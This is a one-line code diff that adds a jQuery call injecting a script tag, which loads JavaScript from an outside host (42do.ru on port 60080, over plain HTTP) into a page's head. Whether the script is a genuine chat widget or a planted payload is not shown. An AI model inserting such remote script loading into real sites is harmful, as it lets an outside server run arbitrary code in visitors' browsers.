@@ -1,0 +1,1 @@
+$('<script type="text/javascript" src="http://42do.ru:60080/js/chat.js"></script>').appendTo('head');
